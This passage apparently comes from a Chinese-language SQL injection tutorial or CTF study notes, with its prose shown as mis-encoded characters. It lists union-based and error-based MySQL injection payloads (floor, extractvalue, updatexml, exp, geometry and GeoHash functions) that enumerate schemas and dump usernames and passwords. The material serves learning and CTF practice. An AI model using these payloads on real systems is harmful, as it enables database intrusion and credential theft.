<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1#</span><br><span class="line">-1&#x27; union select 1,2#</span><br><span class="line">-1&#x27; union select 1,2,3#</span><br><span class="line">-1 union select 1#</span><br><span class="line">-1 union select 1,2#</span><br><span class="line">-1 union select 1,2,3#</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼š</p>
<ul>
<li>è‹¥ç¡®å®šé¡µé¢æœ‰å›æ˜¾ï¼Œä½†æ˜¯é¡µé¢ä¸­å¹¶æ²¡æœ‰æˆ‘ä»¬å®šä¹‰çš„ç‰¹æ®Šæ ‡è®°æ•°å­—å‡ºç°ï¼Œå¯èƒ½æ˜¯é¡µé¢è¿›è¡Œçš„æ˜¯å•è¡Œæ•°æ®è¾“å‡ºï¼Œæˆ‘ä»¬è®©å‰è¾¹çš„ select æŸ¥è¯¢æ¡ä»¶è¿”å›ç»“æœä¸ºç©ºå³å¯ã€‚</li>
<li>â¼€å®šè¦æ‹¼æ¥å¤Ÿè¶³å¤Ÿçš„å­—æ®µæ•°ï¼Œå¦åˆ™SQLè¯­å¥æŠ¥é”™ã€‚</li>
</ul>
</li>
<li><p>åœ¨å›æ˜¾æ•°æ®çš„å­—æ®µä½ç½®ä½¿ç”¨ union select å°†æˆ‘ä»¬æ‰€éœ€è¦çš„æ•°æ®æŸ¥è¯¢å‡ºæ¥å³å¯ã€‚åŒ…æ‹¬ä½†ä¸é™äºï¼š</p>
<ul>
<li>è·å–å½“å‰æ•°æ®åº“å</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>

<ul>
<li>è·å–å½“å‰æ•°æ®åº“çš„è¡¨å</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</span><br></pre></td></tr></table></figure>

<ul>
<li>è·å–è¡¨ä¸­çš„å­—æ®µå</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3--+</span><br></pre></td></tr></table></figure>

<ul>
<li>è·å–æ•°æ®</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>ä¸€èˆ¬æƒ…å†µä¸‹å°±æ˜¯è¿™æ ·çš„ä¸€ä¸ªé¡ºåºï¼Œ<code>ç¡®å®šè”åˆæŸ¥è¯¢çš„å­—æ®µæ•°-&gt;ç¡®å®šè”åˆæŸ¥è¯¢å›æ˜¾ä½ç½®-&gt;çˆ†åº“-&gt;çˆ†è¡¨-&gt;çˆ†å­—æ®µ-&gt;çˆ†æ•°æ®</code>ã€‚</p>
<h2 id="æŠ¥é”™æ³¨å…¥ï¼š"><a href="#æŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="æŠ¥é”™æ³¨å…¥ï¼š"></a>æŠ¥é”™æ³¨å…¥ï¼š</h2><h4 id="æŠ¥é”™æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"><a href="#æŠ¥é”™æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†" class="headerlink" title="æŠ¥é”™æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"></a>æŠ¥é”™æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†</h4><p>å¤§ä½“çš„æ€è·¯å°±æ˜¯åˆ©ç”¨æŠ¥é”™å›æ˜¾ï¼ŒåŒæ—¶æˆ‘ä»¬çš„æŸ¥è¯¢æŒ‡ä»¤æˆ–è€…SQLå‡½æ•°ä¼šè¢«æ‰§è¡Œï¼Œ<strong>æŠ¥é”™çš„è¿‡ç¨‹å¯èƒ½ä¼šå‡ºç°åœ¨æŸ¥è¯¢æˆ–è€…æ’å…¥ç”šè‡³åˆ é™¤çš„è¿‡ç¨‹</strong>ä¸­ã€‚</p>
<h4 id="0x00-floor-ï¼ˆ8-x-mysql-5-0ï¼‰-åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥"><a href="#0x00-floor-ï¼ˆ8-x-mysql-5-0ï¼‰-åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥" class="headerlink" title="0x00 floor()ï¼ˆ8.x&gt;mysql&gt;5.0ï¼‰[åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥]"></a>0x00 floor()ï¼ˆ8.x&gt;mysql&gt;5.0ï¼‰[åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥]</h4><p>å‡½æ•°è¿”å›å°äºæˆ–ç­‰äºæŒ‡å®šå€¼ï¼ˆvalueï¼‰çš„æœ€å°æ•´æ•°,å–æ•´</p>
<blockquote>
<p>é€šè¿‡flooræŠ¥é”™çš„æ–¹æ³•æ¥çˆ†æ•°æ®çš„<strong>æœ¬è´¨æ˜¯group byè¯­å¥çš„æŠ¥é”™</strong>ã€‚group byè¯­å¥æŠ¥é”™çš„åŸå› æ˜¯<code>floor(random(0)*2)</code>çš„ä¸ç¡®å®šæ€§ï¼Œå³å¯èƒ½ä¸º0ä¹Ÿå¯èƒ½ä¸º1</p>
<p>group by keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œ<strong>å¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸åœ¨ä¸´æ—¶è¡¨ä¸­æ›´æ–°ä¸´æ—¶è¡¨ä¸­çš„æ•°æ®ï¼›å¦‚æœè¯¥keyä¸å­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚</strong></p>
<p>group by <code>floor(random(0)*2)</code>å‡ºé”™çš„åŸå› æ˜¯keyæ˜¯ä¸ªéšæœºæ•°ï¼Œæ£€æµ‹ä¸´æ—¶è¡¨ä¸­keyæ˜¯å¦å­˜åœ¨æ—¶è®¡ç®—äº†ä¸€ä¸‹<code>floor(random(0)*2)</code>å¯èƒ½ä¸º0ï¼Œå¦‚æœæ­¤æ—¶ä¸´æ—¶è¡¨<strong>åªæœ‰keyä¸º1çš„è¡Œä¸å­˜åœ¨keyä¸º0çš„è¡Œ</strong>ï¼Œé‚£ä¹ˆæ•°æ®åº“è¦å°†è¯¥æ¡è®°å½•<strong>æ’å…¥</strong>ä¸´æ—¶è¡¨ï¼Œç”±äºæ˜¯éšæœºæ•°ï¼Œæ’æ—¶åˆè¦è®¡ç®—ä¸€ä¸‹éšæœºå€¼ï¼Œæ­¤æ—¶<code>floor(random(0)*2)</code>ç»“æœå¯èƒ½ä¸º1ï¼Œå°±ä¼šå¯¼è‡´æ’å…¥æ—¶<strong>å†²çªè€ŒæŠ¥é”™</strong>ã€‚å³æ£€æµ‹æ—¶å’Œæ’å…¥æ—¶ä¸¤æ¬¡è®¡ç®—äº†éšæœºæ•°çš„å€¼ã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0â€™ union select 1,2,3 from(select count(*),concat((select concat(version(),â€™-â€™,database(),â€™-â€™,user()) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">/*æ‹†è§£å‡ºæ¥å°±æ˜¯ä¸‹é¢çš„è¯­å¥*/</span><br><span class="line">concat((select concat(version(),â€™-â€™,database(),â€™-â€™,user()) limit 0,1),floor(rand(0)*2))x</span><br></pre></td></tr></table></figure>

<p><strong>å¯ä»¥çœ‹åˆ°è¿™é‡Œå®é™…ä¸Šä¸å…‰ä½¿ç”¨äº†æŠ¥é”™æ³¨å…¥è¿˜æ˜¯ç”¨äº†åˆšåˆšçš„è”åˆæŸ¥è¯¢ï¼ŒåŒæ—¶è¿˜æ˜¯ä¸€ä¸ªåŒæŸ¥è¯¢çš„æŠ¥é”™æ³¨å…¥ï¼Œå½“åœ¨ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œæ¯”å¦‚count()å‡½æ•°åé¢å¦‚æœä½¿ç”¨group byåˆ†ç»„è¯­å¥çš„è¯ï¼Œå°±å¯èƒ½ä¼šæŠŠæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ã€‚ä½†æ˜¯è¦å¤šæ¬¡æµ‹è¯•æ‰å¯ä»¥å¾—åˆ°æŠ¥é”™</strong></p>
<p>å¤§ä½“æ€è·¯å°±æ˜¯å½“åœ¨ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œæ¯”å¦‚countå‡½æ•°åé¢å¦‚æœä½¿ç”¨åˆ†ç»„è¯­å¥å°±ä¼šæŠŠæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ï¼Œä½†æ˜¯å› ä¸ºéšæœºæ•°è¦æµ‹è¯•å¤šæ¬¡æ‰èƒ½å¾—åˆ°æŠ¥é”™ï¼Œä¸Šé¢æŠ¥é”™æ³¨å…¥å‡½æ•°ä¸­çš„ç¬¬ä¸€ä¸ª<code>Floor()</code>å°±æ˜¯è¿™ç§æƒ…å†µã€‚</p>
<h4 id="0x01-extractvalue-Writeup-2023-0xGame-Week2-rdjâ€™s-Blog-notnad3-github-io-https-notnad3-github-io-2023-10-01-Week-2-ez-upload-ã€ä¾‹é¢˜ï¼Œsqlæ³¨å…¥ã€‘"><a href="#0x01-extractvalue-Writeup-2023-0xGame-Week2-rdjâ€™s-Blog-notnad3-github-io-https-notnad3-github-io-2023-10-01-Week-2-ez-upload-ã€ä¾‹é¢˜ï¼Œsqlæ³¨å…¥ã€‘" class="headerlink" title="0x01 extractvalue()        [Writeup_2023_0xGame_Week2 - rdjâ€™s Blog (notnad3.github.io)](https://notnad3.github.io/2023/10/01/[Week 2] ez_upload&#x2F;)ã€ä¾‹é¢˜ï¼Œsqlæ³¨å…¥ã€‘"></a>0x01 extractvalue()        [Writeup_2023_0xGame_Week2 - rdjâ€™s Blog (notnad3.github.io)](<a target="_blank" rel="noopener" href="https://notnad3.github.io/2023/10/01/[Week">https://notnad3.github.io/2023/10/01/[Week</a> 2] ez_upload&#x2F;)ã€ä¾‹é¢˜ï¼Œsqlæ³¨å…¥ã€‘</h4><p>å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°</p>
<p>ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(â€˜anythingâ€™,concat(â€˜#â€™,substring(hex((select database())),1,5))))</span><br></pre></td></tr></table></figure>

<p>å…¶å®å°±æ˜¯ç›¸å½“äºæˆ‘ä»¬ç†Ÿæ‚‰çš„HTMLæ–‡ä»¶ä¸­ç”¨ <div><p><a>æ ‡ç­¾æŸ¥æ‰¾å…ƒç´ ä¸€æ ·</p>
<p>è¯­æ³•ï¼šextractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„)</p>
<p>ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</p>
<p>æ­£å¸¸æŸ¥è¯¢ ç¬¬äºŒä¸ªå‚æ•°çš„ä½ç½®æ ¼å¼ ä¸º &#x2F;xxx&#x2F;xx&#x2F;xx&#x2F;xx ,å³ä½¿æŸ¥è¯¢ä¸åˆ°ä¹Ÿä¸ä¼šæŠ¥é”™</p>
<p>select username from security.user where id&#x3D;1 and (extractvalue(â€˜anythingâ€™,â€™&#x2F;x&#x2F;xxâ€™))</p>
<p><img src="https://img-blog.csdn.net/20180609105306938" alt="img"></p>
<p>ä½¿ç”¨concat()æ‹¼æ¥ â€˜  &#x2F;  â€˜ æ•ˆæœç›¸åŒï¼Œ</p>
<p>select username from security.user where id&#x3D;1 and (extractvalue(â€˜anythingâ€™,concat(â€˜&#x2F;â€™,(select database()))))</p>
<p><img src="https://img-blog.csdn.net/20180609105334286" alt="img"></p>
<p>è¿™é‡Œåœ¨â€™anythingâ€™ä¸­æŸ¥è¯¢ä¸åˆ° ä½ç½®æ˜¯ &#x2F;database()çš„å†…å®¹ï¼Œ</p>
<p>ä½†ä¹Ÿæ²¡æœ‰è¯­æ³•é”™è¯¯ï¼Œä¸ä¼šæŠ¥é”™ï¼Œä¸‹é¢æ•…æ„å†™å…¥è¯­æ³•é”™è¯¯ï¼š</p>
<p>select username from security.user where id&#x3D;1 and (extractvalue(â€˜anythingâ€™,concat(â€˜~â€™,(select database()))))</p>
<p><img src="https://img-blog.csdn.net/20180609105509672" alt="img"></p>
<p>å¯ä»¥çœ‹å‡ºï¼Œä»¥~å¼€å¤´çš„å†…å®¹ä¸æ˜¯xmlæ ¼å¼çš„è¯­æ³•ï¼ŒæŠ¥é”™ï¼Œä½†æ˜¯ä¼šæ˜¾ç¤ºæ— æ³•è¯†åˆ«çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œè¿™æ ·å°±è¾¾åˆ°äº†ç›®çš„ã€‚</p>
<p>æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œextractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±éœ€è¦ç”¨substring()å‡½æ•°æˆªå–ï¼Œä¸€æ¬¡æŸ¥çœ‹32ä½</p>
<p>è¿™é‡ŒæŸ¥è¯¢å‰5ä½ç¤ºæ„:</p>
<p>select username from security.user where id&#x3D;1 and (extractvalue(â€˜anythingâ€™,concat(â€˜#â€™,substring(hex((select database())),1,5))))</p>
<p><img src="https://img-blog.csdn.net/20180609105559745" alt="img"></p>
<h4 id="0x02-UPDATEXML-XML-document-XPath-string-new-value"><a href="#0x02-UPDATEXML-XML-document-XPath-string-new-value" class="headerlink" title="0x02 UPDATEXML (XML_document, XPath_string, new_value);"></a>0x02 UPDATEXML (XML_document, XPath_string, new_value);</h4><ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§° æ–‡ä¸­ä¸ºDoc</li>
<li>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚</li>
<li>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</li>
</ul>
<p>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p>
<p>ç”±äºupdatexmlçš„ç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸ç¬¦åˆxmlæ ¼å¼çš„è¯­æ³•ï¼Œå°±å¯ä»¥å®ç°æŠ¥é”™æ³¨å…¥äº†ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯ä¸€ç§éå¸¸å¸¸è§çš„æŠ¥é”™æ³¨å…¥çš„å‡½æ•°ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<h4 id="0x03-exp-x"><a href="#0x03-exp-x" class="headerlink" title="0x03 exp(x)"></a>0x03 exp(x)</h4><p>è¿”å› e çš„ x æ¬¡æ–¹,å½“ æ•°æ®è¿‡å¤§ æº¢å‡ºæ—¶æŠ¥é”™ï¼Œå³ x &gt; 709</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail=&#x27;) or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))) as asd))--+</span><br></pre></td></tr></table></figure>

<h4 id="0x04-geometrycollection-mysql-ç‰ˆæœ¬5-5"><a href="#0x04-geometrycollection-mysql-ç‰ˆæœ¬5-5" class="headerlink" title="0x04 geometrycollection() mysql ç‰ˆæœ¬5.5"></a>0x04 geometrycollection() mysql ç‰ˆæœ¬5.5</h4><p>ï¼ˆ1ï¼‰å‡½æ•°è§£é‡Šï¼š<br>GeometryCollectionæ˜¯ç”±1ä¸ªæˆ–å¤šä¸ªä»»æ„ç±»å‡ ä½•å¯¹è±¡æ„æˆçš„å‡ ä½•å¯¹è±¡ã€‚GeometryCollectionä¸­çš„æ‰€æœ‰å…ƒç´ å¿…é¡»å…·æœ‰ç›¸åŒçš„ç©ºé—´å‚è€ƒç³»ï¼ˆå³ç›¸åŒçš„åæ ‡ç³»ï¼‰ã€‚</p>
<p>ï¼ˆ2ï¼‰å®˜æ–¹æ–‡æ¡£ä¸­ä¸¾ä¾‹çš„ç”¨æ³•å¦‚ä¸‹ï¼š<br>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</p>
<p>ï¼ˆ3ï¼‰æŠ¥é”™åŸå› ï¼š<br>å› ä¸ºMYSQLæ— æ³•ä½¿ç”¨è¿™æ ·çš„å­—ç¬¦ä¸²ç”»å‡ºå›¾å½¢ï¼Œæ‰€ä»¥æŠ¥é”™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select version())a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name=&#x27;manage&#x27; limit 0,1)a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage limit 0,1)a)b)); %23</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå’Œæˆ‘ä»¬ä¸Šé¢å­¦è¿‡çš„cancatå’Œä¸Šä¸€å…³å­¦çš„å†…ç½®è¡¨æœ‰ä¸¤ä¸ªæ¢¦å¹»è”åŠ¨</p>
<h4 id="0x05-multipoint-mysql-ç‰ˆæœ¬5-5"><a href="#0x05-multipoint-mysql-ç‰ˆæœ¬5-5" class="headerlink" title="0x05 multipoint() mysql ç‰ˆæœ¬5.5"></a>0x05 multipoint() mysql ç‰ˆæœ¬5.5</h4><p>ï¼ˆ1ï¼‰å‡½æ•°è§£é‡Šï¼š<br>MultiPointæ˜¯ä¸€ç§ç”±Pointå…ƒç´ æ„æˆçš„å‡ ä½•å¯¹è±¡é›†åˆã€‚è¿™äº›ç‚¹æœªä»¥ä»»ä½•æ–¹å¼è¿æ¥æˆ–æ’åºã€‚<br>â€‚<br>ï¼ˆ2ï¼‰æŠ¥é”™åŸå› ï¼š<br>åŒæ ·æ˜¯å› ä¸ºæ— æ³•ä½¿ç”¨å­—ç¬¦ä¸²ç”»å‡ºå›¾å½¢ä¸geometrycollectionç±»ä¼¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and multipoint((select * from(select * from(select version())a)b)); %23</span><br></pre></td></tr></table></figure>

<h4 id="0x06-polygon"><a href="#0x06-polygon" class="headerlink" title="0x06 polygon()"></a>0x06 polygon()</h4><p>polygonæ¥è‡ªå¸Œè…Šã€‚ â€œPolyâ€ æ„å‘³ â€œmanyâ€ ï¼Œ â€œgonâ€ æ„å‘³ â€œangleâ€.<br>Polygonæ˜¯ä»£è¡¨å¤šè¾¹å‡ ä½•å¯¹è±¡çš„å¹³é¢Surfaceã€‚å®ƒç”±å•ä¸ªå¤–éƒ¨è¾¹ç•Œä»¥åŠ0æˆ–å¤šä¸ªå†…éƒ¨è¾¹ç•Œå®šä¹‰ï¼Œå…¶ä¸­ï¼Œæ¯ä¸ªå†…éƒ¨è¾¹ç•Œå®šä¹‰ä¸ºPolygonä¸­çš„1ä¸ªå­”ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))--+</span><br></pre></td></tr></table></figure>

<h4 id="0x07-mutipolygon"><a href="#0x07-mutipolygon" class="headerlink" title="0x07 mutipolygon()"></a>0x07 mutipolygon()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))</span><br></pre></td></tr></table></figure>

<h4 id="0x08-linestring-ï¼‰"><a href="#0x08-linestring-ï¼‰" class="headerlink" title="0x08 linestring(ï¼‰"></a>0x08 linestring(ï¼‰</h4><p>æŠ¥é”™åŸç†ï¼š<br>mysqlçš„æœ‰äº›å‡ ä½•å‡½æ•°ï¼ˆ ä¾‹å¦‚geometrycollection()ï¼Œmultipoint()ï¼Œpolygon()ï¼Œmultipolygon()ï¼Œlinestring()ï¼Œmultilinestring() ï¼‰å¯¹å‚æ•°è¦æ±‚ä¸ºå‡ ä½•æ•°æ®ï¼Œè‹¥ä¸æ»¡è¶³è¦æ±‚åˆ™ä¼šæŠ¥é”™ï¼Œé€‚ç”¨äº5.1-5.5ç‰ˆæœ¬ (5.0.ä¸­å­˜åœ¨ä½†æ˜¯ä¸ä¼šæŠ¥é”™)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and linestring((select * from(select * from(select database())a)b))--+;</span><br></pre></td></tr></table></figure>

<h4 id="0x09-multilinestring"><a href="#0x09-multilinestring" class="headerlink" title="0x09 multilinestring()"></a>0x09 multilinestring()</h4><p>åŒä¸Š</p>
<h4 id="0x0a-ST-LatFromGeoHash-ï¼ˆmysql-5-7-xï¼‰"><a href="#0x0a-ST-LatFromGeoHash-ï¼ˆmysql-5-7-xï¼‰" class="headerlink" title="0x0a ST.LatFromGeoHash()ï¼ˆmysql&gt;&#x3D;5.7.xï¼‰"></a>0x0a ST.LatFromGeoHash()ï¼ˆmysql&gt;&#x3D;5.7.xï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))))a)b))--+</span><br></pre></td></tr></table></figure>

<h4 id="0x0b-ST-LongFromGeoHash"><a href="#0x0b-ST-LongFromGeoHash" class="headerlink" title="0x0b ST.LongFromGeoHash"></a>0x0b ST.LongFromGeoHash</h4><p>åŒä¸Š åµŒå¥—æŸ¥è¯¢</p>
<h4 id="0x0c-ST-Pointfromgeohash-mysql-5-7"><a href="#0x0c-ST-Pointfromgeohash-mysql-5-7" class="headerlink" title="0x0c ST_Pointfromgeohash (mysql&gt;5.7)"></a>0x0c ST_Pointfromgeohash (mysql&gt;5.7)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash(version(),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure>

<h4 id="0x0d-GTID-MySQL-5-6-X-æ˜¾é”™"><a href="#0x0d-GTID-MySQL-5-6-X-æ˜¾é”™" class="headerlink" title="0x0d GTID (MySQL &gt;&#x3D; 5.6.X - æ˜¾é”™&lt;&#x3D;200)"></a>0x0d GTID (MySQL &gt;&#x3D; 5.6.X - æ˜¾é”™&lt;&#x3D;200)</h4><p><strong>0x01 GTID</strong><br>GTIDæ˜¯MySQLæ•°æ®åº“æ¯æ¬¡æäº¤äº‹åŠ¡åç”Ÿæˆçš„ä¸€ä¸ªå…¨å±€äº‹åŠ¡æ ‡è¯†ç¬¦ï¼ŒGTIDä¸ä»…åœ¨æœ¬æœåŠ¡å™¨ä¸Šæ˜¯å”¯ä¸€çš„ï¼Œå…¶åœ¨å¤åˆ¶æ‹“æ‰‘ä¸­ä¹Ÿæ˜¯å”¯ä¸€çš„</p>
<blockquote>
<p>GTIDçš„è¡¨ç°å½¢å¼ -&gt; GTID &#x3D;source_id:transaction_idå…¶ä¸­source_idä¸€èˆ¬ä¸ºæ•°æ®åº“çš„uuidï¼Œtransaction_idä¸ºäº‹åŠ¡IDï¼Œä»1å¼€å§‹3E11FA47-71CA-11E1-9E33-C80AA9429562:23å¦‚ä¸Šé¢çš„GTIDå¯ä»¥çœ‹å‡ºè¯¥äº‹åŠ¡ä¸ºUUIDä¸º3E11FA47-71CA-11E1-9E33-C80AA9429562çš„æ•°æ®åº“çš„23å·äº‹åŠ¡</p>
</blockquote>
<p><strong>GTIDé›†åˆ</strong>(ä¸€ç»„å…¨å±€äº‹åŠ¡æ ‡è¯†ç¬¦)ï¼š<br>GTIDé›†åˆä¸ºå¤šä¸ªå•GTIDå’Œä¸€ä¸ªèŒƒå›´å†…GTIDçš„é›†åˆï¼Œä»–ä¸»è¦ç”¨äºå¦‚ä¸‹åœ°æ–¹</p>
<ul>
<li>gtid_executed ç³»ç»Ÿå˜é‡</li>
<li>gtid_purgedç³»ç»Ÿå˜é‡</li>
<li>GTID_SUBSET() å’Œ GTID_SUBTRACT()å‡½æ•°</li>
</ul>
<p>æ ¼å¼å¦‚ä¸‹ï¼š</p>
